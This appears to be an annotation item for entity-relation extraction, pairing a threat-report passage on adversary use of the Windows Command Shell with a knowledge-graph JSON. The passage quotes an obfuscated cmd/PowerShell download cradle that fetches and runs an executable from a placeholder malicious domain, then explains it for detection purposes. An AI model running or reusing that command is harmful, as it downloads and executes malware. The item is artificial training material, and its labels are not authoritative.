@@ -1,0 +1,126 @@
+
+
+
+Sentence : Analysis
+Why do adversaries use Windows
+Command Shell?
+Windows Command Shell is ubiquitous across all versions of Windows and,
+unlike its more sophisticated and capable cousin, PowerShell, the Windows
+Command Shell takes no dependencies on specific versions of .NET. While
+Command Shell’s native capabilities are limited, they have been stable for years,
+maybe even decades. Adversaries know that if ~~cmd.exe~~ works in their lab, it’s
+going to work in the field.
+The Windows Command Shell is the no-frills field general in an adversary’s
+arsenal. It may not be able to do much on its own, but it is capable of calling on
+virtually any executable on the system to carry out its mission.
+Because Command Shell can execute batch files, adversaries can use it to
+reliably and repeatedly execute arbitrary tasks.
+How do adversaries use Windows
+Command Shell?
+In a review of more than 1,000 confirmed threat detections, we found ~~cmd.exe~~
+called more than 6,000 times in more than 4,000 unique command lines across
+hundreds of customer environments. PowerShell was a child process of ~~cmd~~
+in more than 480 instances. We saw more than 350 references to unique batch
+files and 270 unique scheduled tasks calling ~~cmd~~ across more than 30 customer
+environments.
+One of the most commonly observed techniques is the use of ~~cmd~~ to call native
+commands and redirect the output of those commands to a file on the local
+admin share, for example:
+l [T1059.003: Windows Command Shell]
+17
+2021 Threat Detection Report
+This technique is consistent with Impacket, an open source tool that adversaries
+use to manipulate networking protocols. We observed similar patterns of
+execution and output redirection nearly 400 times across more than a dozen
+customer environments.
+Emerging Windows Command
+Shell tradecraft
+Windows Command Shell was originally released in 1987 and, though it has new
+user-interface features in Windows 10, it has a relatively limited set of built-in
+commands—commands that may be invoked without starting a new process
+on the system. This old dog isn’t really doing new tricks. In the last quarter of
+2020, we observed 11 detections for ~~cmd.exe~~ replacing ~~utilman.exe~~ enabling
+authentication bypass. The only Windows Command Shell detections with
+higher frequency counts in that quarter involved suspected red team activity
+and similar internal testing tools.
+Having said that, if there is anything novel involving ~~cmd.exe~~ ~~,~~ it may be
+obfuscation. In the spring of 2018, Daniel Bohannon released a whitepaper on
+DOS obfuscation techniques and a framework called Invoke-DOSfucation for
+creating obfuscated DOS command lines that could be used to evade simple,
+signature-based detections and slow down human analysis. In our data set of
+more than 1,000 detections involving the Windows Command Shell, we found 91
+unique command lines involving some measure of obfuscation. The most heavily
+obfuscated DOS command we observed was similar to the one shown here:
+l [T1059.003: Windows Command Shell]
+C O M M A N D S H E L L
+“Adversaries may abuse the Windows
+command shell for execution. The
+Windows command shell ~~(~~ ~~cmd.exe~~ )
+is the primary command prompt
+on Windows systems. The Windows
+command prompt can be used to
+control almost any aspect of a system,
+with various permission levels required
+for different subsets of commands.”
+18
+2021 Threat Detection Report
+In the Windows Command Shell, the caret ~~(~~ ~~^~~ ) character is an escape character.
+When it precedes special characters, like the pipe ( ~~|~~ ~~)~~ character or file redirection
+operators ~~(~~ ~~<>~~ ~~)~~, those special characters will be treated as normal characters.
+When the caret symbol precedes non-special characters, nothing special
+happens; it is effectively ignored. So the command above becomes:
+```
+        cmd /V/C”set N1=   }}{hctac};kaerb;iB$ metI
+        ekovnI;)iB$,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni
+    dq$(hcaerof;’exe.’+Kjm$+’\’+cilbup:vne$=iB$;’963’
+
+    = Kjm$;)’@’(tilpS.’detcefni=l?php.suoici/lam/
+
+    niamod.live//:ptth’=tlm$;tneilCbeW.teN tcejbo
+    wen=cAB$ llehsrewop&&for /L %R in (265;-1;0)do
+
+    set ZR=!ZR!!N1:~%R,1!&&if %R==0 call %ZR:*ZR!=%
+
+```
+Looking at this command carefully, we can see it sets a variable named ~~N1~~ to
+a string containing a PowerShell command that is reversed. There’s a ~~For~~ loop
+that reverses this string and executes it. The PowerShell command creates a
+download cradle to download a file and invokes it via a call to ~~Invoke-Item~~ .
+While these obfuscated commands may evade simple, signature-based
+detections, analytics that look for commonly used obfuscation techniques, such
+as the presence of caret characters, can easily detect them. Layered detection
+analytics will also help. If a detection misses the obfuscated DOS commands,
+another detection may trigger on the PowerShell download cradle, the call to
+~~Invoke-Item~~ ~~,~~ or a DNS lookup to an unusual domain.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "cmd.exe", "type" : "EXEF"},
+        {"id": 2, "description": "PowerShell", "type" : "APPS"},
+        {"id": 3, "description": "batch files", "type" : "DOCF"},
+        {"id": 4, "description": "scheduled tasks", "type" : "TPTH"},
+        {"id": 5, "description": "local admin share", "type" : "SYSP"},
+        {"id": 6, "description": "Impacket", "type" : "APPS"},
+        {"id": 7, "description": "utilman.exe", "type" : "EXEF"},
+        {"id": 8, "description": "DOS obfuscation techniques", "type" : "TTPS"},
+        {"id": 9, "description": "Invoke-DOSfucation", "type" : "APPS"},
+        {"id": 10, "description": "obfuscated DOS command lines", "type" : "DOCF"},
+        {"id": 11, "description": "Windows Command Shell", "type" : "TTPS"},
+        {"id": 12, "description": "Caret character (^)", "type" : "SYSP"},
+        {"id": 13, "description": "PowerShell download cradle", "type" : "DOCF"},
+        {"id": 14, "description": "Invoke-Item", "type" : "TTPS"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "calls"},
+        {"source": 1, "target": 3, "rel_name" : "executes"},
+        {"source": 1, "target": 4, "rel_name" : "creates"},
+        {"source": 1, "target": 5, "rel_name" : "writes to"},
+        {"source": 6, "target": 1, "rel_name" : "uses"},
+        {"source": 1, "target": 7, "rel_name" : "replaces"},
+        {"source": 8, "target": 9, "rel_name" : "implemented in"},
+        {"source": 1, "target": 10, "rel_name" : "generates"},
+        {"source": 11, "target": 1, "rel_name" : "involves"},
+        {"source": 12, "target": 1, "rel_name" : "used in"},
+        {"source": 13, "target": 14, "rel_name" : "invokes"}
+    ]
+}
